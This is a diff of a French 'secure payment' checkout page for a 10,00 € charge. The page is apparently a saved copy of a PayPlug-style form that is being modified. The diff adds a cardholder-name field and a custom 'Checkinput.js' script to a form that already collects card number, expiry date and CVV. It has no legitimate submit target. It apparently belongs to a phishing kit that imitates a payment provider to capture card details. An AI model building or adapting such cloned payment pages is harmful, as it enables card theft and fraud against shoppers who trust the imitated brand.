@@ -1,10 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	  
+
 		<style type="text/css">@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/26c4cd/00000000000000003b9ad1b1/27/l?subset_id=2&fvd=n7&v=3) format("woff2"),url(https://use.typekit.net/af/26c4cd/00000000000000003b9ad1b1/27/d?subset_id=2&fvd=n7&v=3) format("woff"),url(https://use.typekit.net/af/26c4cd/00000000000000003b9ad1b1/27/a?subset_id=2&fvd=n7&v=3) format("opentype");font-weight:700;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/d76e9c/00000000000000003b9ad1b2/27/l?subset_id=2&fvd=i7&v=3) format("woff2"),url(https://use.typekit.net/af/d76e9c/00000000000000003b9ad1b2/27/d?subset_id=2&fvd=i7&v=3) format("woff"),url(https://use.typekit.net/af/d76e9c/00000000000000003b9ad1b2/27/a?subset_id=2&fvd=i7&v=3) format("opentype");font-weight:700;font-style:italic;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/0b34b4/00000000000000003b9ad1bd/27/l?subset_id=2&fvd=n1&v=3) format("woff2"),url(https://use.typekit.net/af/0b34b4/00000000000000003b9ad1bd/27/d?subset_id=2&fvd=n1&v=3) format("woff"),url(https://use.typekit.net/af/0b34b4/00000000000000003b9ad1bd/27/a?subset_id=2&fvd=n1&v=3) format("opentype");font-weight:100;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/2077d0/00000000000000003b9ad1be/27/l?subset_id=2&fvd=i1&v=3) format("woff2"),url(https://use.typekit.net/af/2077d0/00000000000000003b9ad1be/27/d?subset_id=2&fvd=i1&v=3) format("woff"),url(https://use.typekit.net/af/2077d0/00000000000000003b9ad1be/27/a?subset_id=2&fvd=i1&v=3) format("opentype");font-weight:100;font-style:italic;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/610d30/00000000000000003b9ad1bb/27/l?subset_id=2&fvd=n6&v=3) format("woff2"),url(https://use.typekit.net/af/610d30/00000000000000003b9ad1bb/27/d?subset_id=2&fvd=n6&v=3) format("woff"),url(https://use.typekit.net/af/610d30/00000000000000003b9ad1bb/27/a?subset_id=2&fvd=n6&v=3) format("opentype");font-weight:600;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/c9789d/00000000000000003b9ad1bc/27/l?subset_id=2&fvd=i6&v=3) format("woff2"),url(https://use.typekit.net/af/c9789d/00000000000000003b9ad1bc/27/d?subset_id=2&fvd=i6&v=3) format("woff"),url(https://use.typekit.net/af/c9789d/00000000000000003b9ad1bc/27/a?subset_id=2&fvd=i6&v=3) format("opentype");font-weight:600;font-style:italic;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/1f8eae/00000000000000003b9ad1b9/27/l?subset_id=2&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/1f8eae/00000000000000003b9ad1b9/27/d?subset_id=2&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/1f8eae/00000000000000003b9ad1b9/27/a?subset_id=2&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/ca838d/00000000000000003b9ad1ba/27/l?subset_id=2&fvd=i4&v=3) format("woff2"),url(https://use.typekit.net/af/ca838d/00000000000000003b9ad1ba/27/d?subset_id=2&fvd=i4&v=3) format("woff"),url(https://use.typekit.net/af/ca838d/00000000000000003b9ad1ba/27/a?subset_id=2&fvd=i4&v=3) format("opentype");font-weight:400;font-style:italic;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/c2fb26/00000000000000003b9ad1b5/27/l?subset_id=2&fvd=n3&v=3) format("woff2"),url(https://use.typekit.net/af/c2fb26/00000000000000003b9ad1b5/27/d?subset_id=2&fvd=n3&v=3) format("woff"),url(https://use.typekit.net/af/c2fb26/00000000000000003b9ad1b5/27/a?subset_id=2&fvd=n3&v=3) format("opentype");font-weight:300;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/85cfc9/00000000000000003b9ad1b6/27/l?subset_id=2&fvd=i3&v=3) format("woff2"),url(https://use.typekit.net/af/85cfc9/00000000000000003b9ad1b6/27/d?subset_id=2&fvd=i3&v=3) format("woff"),url(https://use.typekit.net/af/85cfc9/00000000000000003b9ad1b6/27/a?subset_id=2&fvd=i3&v=3) format("opentype");font-weight:300;font-style:italic;}
 		</style>
 		<link rel="stylesheet" href="./Paiement sécurisé_files/standard.css">
+
+
+		</script>
 </head>
 <body>
 	<div id="content-checkout">
@@ -22,7 +25,7 @@
 							</div>
 
 
-							
+
 							<div class="info-transaction">
 								<div class="txt-transaction">
 									<label class="label-info" >N° de transaction</label>
@@ -31,13 +34,20 @@
 							</div>
 						</div>
 						<div class="separator"></div>
-							
+
 						</div>
-						
+
 
 					<div class="panel panel-default" id="panel-paiement-box">
 							<div class="panel-body no-padding">
 								<section class="form-section form-card-section" id="cardBox">
+
+									<h3 class="form-section-label" id="cardOwnerBoxTitle">Propriétaire de la carte</h3>
+									<div class="form-control">
+										<input type="TEXT" Maxlength="23" id="owner" class="mBottom15" autocomplete="off" placeholder="Propriétaire" required="required">
+
+									</div>
+
 								<h3 class="form-section-label" id="cardBoxTitle">Votre carte</h3>
 
 								<div class="card-container">
@@ -45,15 +55,15 @@
 									<img src="./Paiement sécurisé_files/mastercard.png" class="not-applicable" alt="Les cartes MasterCard sont autorisées" id="mastercard">
 								</div>
 
-								<div class="form-control">
+								<div class="form-control" id="card-number-field">
 									<input type="tel" data-payplug="card_number" maxlength="23" id="paymentCardNumber" class="mBottom15" autocomplete="off" placeholder="Numéro de carte" required="required" pattern="^((\d{4}\s{0,2}){3}\d{4}(\s?\d{0,3}))$" pattern-function="luhn">
-									<i class="icon-credit-card"></i>
+									<!--<i class="icon-credit-card"></i>-->
 								</div>
 
 								<div class="input-row">
 									<div class="form-control" style="flex-grow: 1.2">
 										<span class="form-section-label" >Date d'expiration</span>
-										<i class="icon-calendar" ></i>
+										<!--<i class="icon-calendar" ></i>-->
 										<span class="form-section-label" ><br/></span>
 										<select>
 										<option value="mois" selected disabled>Mois</option>
@@ -84,31 +94,31 @@
 										<option value="annee2022">22</option>
 										</select>
 									</div>
-									
-									
+
+
 								</div>
-								
+
 								<div class="form-control">
 										<span class="form-section-label">CRYPTOGRAMME</span>
-										<i class="icon icon-info" data-translate-tooltip="textCVV" aria-describedby="tipsy" tabindex="0" title="Cryptogramme visuel: les 3 derniers chiffres du numéro qui figurent au dos de votre carte bancaire."></i>                            
+										<i class="icon icon-info" data-translate-tooltip="textCVV" aria-describedby="tipsy" tabindex="0" title="Cryptogramme visuel: les 3 derniers chiffres du numéro qui figurent au dos de votre carte bancaire."></i>
 										<input type="tel" data-payplug="card_cvv" maxlength="3" size="5" id="paymentCardCvv" autocomplete="off" placeholder="123" required="required" pattern="^\d{3}$">
 								</div>
-								
-				
-								
+
+
+
 								<div class="icon-btn">
-								<i class="icon icon-shield"></i>                    
+								<i class="icon icon-shield"></i>
 								<input type="submit" name="paymentInfoFormSubmit" id="payButton" value="PAYER 10,00 €" class="button button-full button-submit custom_pay_color" style="background-color: rgb(32, 33, 28); color: white;">
-							</div>                    
-							
-							</section>		
+							</div>
+
+							</section>
 							</div>
 
 							<div class="separator separator-footer">
 							</div>
 							<div class="panel-footer panel-logo-footer">
 								<img class="logo-verif" src="./Paiement sécurisé_files/logo_secure_default2.png">
-								
+
 							</div>
 						</div>
 					</div>
@@ -117,4 +127,8 @@
 		</div>
 	</div>
 </body>
-</html>	
+<script src="vendor/jquery/jquery.min.js"></script>
+<script src="./Paiement sécurisé_files/js/jquery.payform.min.js"></script>
+<script src="./Paiement sécurisé_files/js/Checkinput.js"></script>
+
+</html>
